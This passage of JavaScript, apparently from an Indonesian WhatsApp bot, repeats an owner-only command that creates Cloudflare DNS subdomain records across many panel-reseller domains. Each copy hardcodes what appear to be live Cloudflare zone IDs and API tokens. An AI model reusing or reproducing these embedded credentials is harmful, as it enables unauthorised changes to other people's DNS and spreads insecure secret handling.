           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd11': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e60307683c18389584e9ae2f9fa707b2";
               let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg"
               let tld = "moon-offc.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd12': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba364ec1df6998c10487aee2a61b7f0d";
               let apitoken = "hnM3i7bBHzcIRXqveYKR3KTnsfrkigkhar2vEUcP"
               let tld = "moon-offc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case 'd13': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2feafa10ec4054af7cb04b18515013e5";
               let apitoken = "8WA6BgIuvFO5AL3xJZf3bsM0ts8aIZiFbxj90icK"
               let tld = "tokopanellmurah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd14': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2dc001900c742f289eef7dbae7ab784b";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "bisnispanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
                
case  'd15': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "77c6588b3b36e74d07538e62ef91d6ba";
               let apitoken = "SgON4r6174fMe3h3B9wyP3caEtwUIfnVuNvSpl1k"
               let tld = "tokopanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd16': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4049d75623d46e90d616fdf878a5ed84";
               let apitoken = "qwAWquCm1cqKEzZnZUEuAbfFq3PCOLleQZifxPog"
               let tld = "store-panel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd17': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8080d914883ed0b9e17d281f593df945";
               let apitoken = "BP2uUPgVfrM4pHW_ivo2AawAyiLqOMYoLYyS2BF7"
               let tld = "sellerpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd18': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cada0ecef8f1e8d904435d469aef1b05";
               let apitoken = "54kx4yvi3CBqomC99WSaqZo9tbxHoe9U-ncBIVMx"
               let tld = "mypanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd19': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d318f96a6327c5340d136415e860f545";
               let apitoken = "RTe9hBdh_-nt0wzOvYN183JyQC011yaiodQ7Po1b"
               let tld = "kangpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd20': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "8132a433dc4eea653e38e168f2f45fc0";
               let apitoken = "33F2gfJ0cEoLv4NlEqLYGd6Ahc5_dzyUH_ClKuX_"
               let tld = "jasapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd21': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
               let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd"
               let tld = "dewapanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break                  
case  'd22': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "98264c6c53c5bc9080230b077422d748";
               let apitoken = "1W9IHC9mLAKj8hQaMjczy0gA3Of7kPjJ3gAvTlnZ"
               let tld = "adminpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd23': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9b28f4ad0f06b36dd94cc56b01efc19a";
               let apitoken = "bMiZlOhkSzozUq1jMLO5bk4OeZr0GllyVtVWX1F4"
               let tld = "plerkuda.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) replyviex(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd24': {
        if (!TradID) return replyviex(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2bb49b2de0cbf75c0462ed90d7d333e1";
               let apitoken = "lZ0XMXdnwp2L1DsI3f8frkPwvkQ6ENee2PnAfOsY"
               let tld = "cafegt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
